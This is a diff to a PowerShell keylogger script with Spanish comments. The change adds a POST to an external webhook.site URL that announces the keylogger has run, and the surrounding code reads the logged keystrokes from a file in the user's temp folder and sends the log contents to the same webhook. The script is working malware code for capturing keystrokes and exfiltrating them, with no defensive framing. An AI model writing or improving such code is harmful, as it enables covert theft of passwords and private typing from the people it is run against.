@@ -1,5 +1,17 @@
-# URL del webhook donde enviar los registros
+# URL del webhook donde enviar los registros y la confirmación de ejecución
 $webhookUrl = "https://webhook.site/48528db4-d568-4e39-93ef-31b378734d99"
+
+# Enviar notificación al webhook
+$confirmationMessage = "El keylogger se ha ejecutado."
+
+# Enviar la confirmación al webhook
+$params = @{
+    Uri = $webhookUrl
+    Method = "POST"
+    Body = $confirmationMessage
+    ContentType = "text/plain"
+}
+Invoke-RestMethod @params
 
 # keylogger
 function KeyLogger($logFile="$env:temp/$env:UserName.log") {
@@ -56,16 +68,6 @@ function KeyLogger($logFile="$env:temp/$env:UserName.log") {
         }
     }
     catch {
-        # Enviar confirmación de conexión al webhook
-        $confirmationMessage = "El keylogger se ha conectado correctamente."
-        $params = @{
-            Uri = $webhookUrl
-            Method = "POST"
-            Body = $confirmationMessage
-            ContentType = "text/plain"
-        }
-        Invoke-RestMethod @params
-
         # Enviar el contenido del archivo de registro al webhook
         $logs = Get-Content $logFile -Raw
         $params = @{
